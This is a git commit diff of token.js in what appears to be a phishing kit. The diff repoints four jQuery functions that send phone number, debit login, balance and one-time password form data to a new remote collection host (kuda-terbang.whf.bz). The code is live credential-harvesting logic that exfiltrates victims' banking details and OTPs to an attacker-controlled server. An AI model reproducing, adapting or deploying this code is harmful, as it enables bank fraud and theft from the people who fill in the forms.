0b36ba017a7067461567b5a318f27df29dc8fd26
dodypribadi5 <dodypribadi5@gmail.com>
2025-01-26 10:04:58 +0700

    Update token.js

--- token.js
+++ token.js
@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/gg/no.php',
+        url: 'https://kuda-terbang.whf.bz/notif/gg/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -40,7 +40,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/gg/login.php',
+        url: 'https://kuda-terbang.whf.bz/notif/gg/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -75,7 +75,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/gg/saldo.php',
+        url: 'https://kuda-terbang.whf.bz/notif/gg/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -108,7 +108,7 @@ function sendOtp(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/gg/otp.php',
+        url: 'https://kuda-terbang.whf.bz/notif/gg/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',    
     complete: function(){
